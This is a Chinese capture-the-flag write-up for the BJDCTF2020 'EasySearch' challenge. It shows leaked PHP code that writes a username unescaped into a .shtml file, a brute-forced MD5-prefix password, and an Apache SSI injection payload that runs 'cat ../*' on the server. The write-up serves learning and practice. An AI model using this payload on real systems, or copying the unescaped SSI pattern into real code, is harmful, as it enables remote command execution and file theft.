# \[BJDCTF2020]EasySearch

## \[BJDCTF2020]EasySearch

## 考点

* Apache SSI 远程命令执行漏洞

## wp

扫描存在index.php.swp文件，给了一部分代码

```php
<?php
  ob_start();
  function get_hash(){
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
    $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
    $content = uniqid().$random;
    return sha1($content); 
  }
    header("Content-Type: text/html;charset=utf-8");
  ***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
      ***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
      echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
  ***
    }
  ***
?>
```

password的md5值前6位要是6d0bc1，脚本爆破出来是2020666，在返回头给了文件地址

![](<../.gitbook/assets/image (2) (1) (1) (1).png>)

shtml存在一个Apache SSI 远程命令执行漏洞，在登录界面使用如下payload

```
username=<!--#exec cmd="cat ../*" -->&password=2020666
```

![](<../.gitbook/assets/image (13) (1) (1) (1).png>)

再返回返回的`Url_is_here`就可以了

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

## 小结

1. 查查Apache SSI 远程命令执行漏洞
